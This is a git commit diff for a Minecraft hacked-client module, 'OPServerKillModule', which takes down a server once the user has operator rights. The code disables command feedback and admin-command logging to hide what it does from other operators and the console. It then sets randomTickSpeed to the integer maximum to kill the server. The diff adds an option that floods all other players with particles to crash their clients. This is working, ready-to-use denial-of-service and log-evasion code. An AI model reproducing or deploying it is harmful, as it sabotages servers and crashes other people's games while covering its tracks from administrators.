2efec136c32aac8b9b837d2e1c294e62dd524b7b
aaaasdfghjkllll <157814835+aaaasdfghjkllll@users.noreply.github.com>
2024-01-27 18:32:18 +0100

    Add .crash command and crash others to OPServerKillModule

--- src/main/java/pwn/noobs/trouserstreak/modules/OPServerKillModule.java
+++ src/main/java/pwn/noobs/trouserstreak/modules/OPServerKillModule.java
@@ -10,50 +10,48 @@ import pwn.noobs.trouserstreak.Trouser;
 public class OPServerKillModule extends Module {
     private final SettingGroup sgGeneral = settings.getDefaultGroup();
     public final Setting<Boolean> dontBeStupid = sgGeneral.add(new BoolSetting.Builder()
-            .name("Restrict Singleplayer Use")
+            .name("restrict-singleplayer-use")
             .description("Does not allow you to screw up your singleplayer worlds. Turn off for 'testing' purposes.")
             .defaultValue(true)
             .build()
     );
     public final Setting<Boolean> notOP = sgGeneral.add(new BoolSetting.Builder()
-            .name("Toggle Module if not OP")
+            .name("toggle-if-not-op")
             .description("Turn this off to prevent the bug of module always being turned off when you join server.")
             .defaultValue(false)
             .build()
     );
     private final Setting<Boolean> sendCommandFeedback = sgGeneral.add(new BoolSetting.Builder()
-            .name("turn off sendCommandFeedback")
+            .name("turn-off-sendCommandFeedback")
             .description("Makes commands invisible to other operators.")
             .defaultValue(true)
             .build()
     );
     private final Setting<Boolean> logAdminCommands = sgGeneral.add(new BoolSetting.Builder()
-            .name("turn off logAdminCommands")
+            .name("turn-off-logAdminCommands")
             .description("Hides the kill command from console logs.")
             .defaultValue(true)
             .build()
     );
-    private final Setting<Integer> tickdelay = sgGeneral.add(new IntSetting.Builder()
-            .name("Tick Delay")
-            .description("The delay between commands sent.")
-            .defaultValue(1)
-            .min(0)
+    private final Setting<Boolean> crashOtherPlayers = sgGeneral.add(new BoolSetting.Builder()
+            .name("crash-other-players")
+            .description("Crashes everyone else's minecraft client. Don't forget to enable Anti Crash in Rejects!")
+            .defaultValue(true)
             .build()
     );
     private final Setting<Integer> killvalue = sgGeneral.add(new IntSetting.Builder()
-            .name("randomTickSpeed (kill value)")
-            .description("This is what kills server. Max value is best.")
-            .defaultValue(999999999)
+            .name("randomTickSpeed-(kill-value)")
+            .description("This is what kills the server. Max value recommended.")
+            .defaultValue(2147483647)
             .min(0)
-                    .max(999999999)
-                    .sliderRange(0, 999999999)
+                    .max(2147483647)
+                    .sliderRange(0, 2147483647)
             .build()
     );
+
     public OPServerKillModule() {
         super(Trouser.Main, "OPServerKillModule", "Runs a set of commands to disable a server. Requires OP. (ONLY USE IF YOU'RE 100% SURE)");
     }
-
-    private int ticks=0;
 
     @Override
     public void onActivate() {
@@ -65,56 +63,16 @@ public class OPServerKillModule extends Module {
             toggle();
             error("Must have permission level 2 or higher");
         }
-            ticks=0;
     }
 
     @EventHandler
     public void onTick(TickEvent.Pre event) {
-        ticks++;
-        if (sendCommandFeedback.get() && logAdminCommands.get()){
-            if (ticks == 1*tickdelay.get()){ //prevent people from seeing the commands being executed
-                ChatUtils.sendPlayerMsg("/gamerule sendCommandFeedback false");
-            }
-            if (ticks == 2*tickdelay.get()){ //prevent console logging the command to cover up tracks
-                ChatUtils.sendPlayerMsg("/gamerule logAdminCommands false");
-            }
-            if (ticks == 3*tickdelay.get()){ //kill server
-                ChatUtils.sendPlayerMsg("/gamerule randomTickSpeed "+killvalue.get());
-            }
-            if (ticks > 3*tickdelay.get()){ //kill server
-                toggle();
-                error("Server Killed.");
-            }
-        } else if (!sendCommandFeedback.get() && logAdminCommands.get()){
-            if (ticks == 1*tickdelay.get()){
-                ChatUtils.sendPlayerMsg("/gamerule logAdminCommands false");
-            }
-            if (ticks == 2*tickdelay.get()){
-                ChatUtils.sendPlayerMsg("/gamerule randomTickSpeed "+killvalue.get());
-            }
-            if (ticks > 2*tickdelay.get()){ //kill server
-                toggle();
-                error("Server Killed.");
-            }
-        } else if (sendCommandFeedback.get() && !logAdminCommands.get()){
-            if (ticks == 1*tickdelay.get()){
-                ChatUtils.sendPlayerMsg("/gamerule sendCommandFeedback false");
-            }
-            if (ticks == 2*tickdelay.get()){
-                ChatUtils.sendPlayerMsg("/gamerule randomTickSpeed "+killvalue.get());
-            }
-            if (ticks > 2*tickdelay.get()){ //kill server
-                toggle();
-                error("Server Killed.");
-            }
-        } else if (!sendCommandFeedback.get() && !logAdminCommands.get()){
-            if (ticks == 1*tickdelay.get()){
-                ChatUtils.sendPlayerMsg("/gamerule randomTickSpeed "+killvalue.get());
-            }
-            if (ticks > 1*tickdelay.get()){ //kill server
-                toggle();
-                error("Server Killed.");
-            }
-        }
+        // Sending messages each tick is not required due to the packet queue
+        if(sendCommandFeedback.get()) ChatUtils.sendPlayerMsg("/gamerule sendCommandFeedback false");
+        if(logAdminCommands.get()) ChatUtils.sendPlayerMsg("/gamerule logAdminCommands false");
+        if(crashOtherPlayers.get()) ChatUtils.sendPlayerMsg("/execute at @a[distance=.1..] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a[distance=.1..]");
+        ChatUtils.sendPlayerMsg("/gamerule randomTickSpeed " + killvalue.get());
+        toggle();
+        error("Server Killed.");
     }
 }
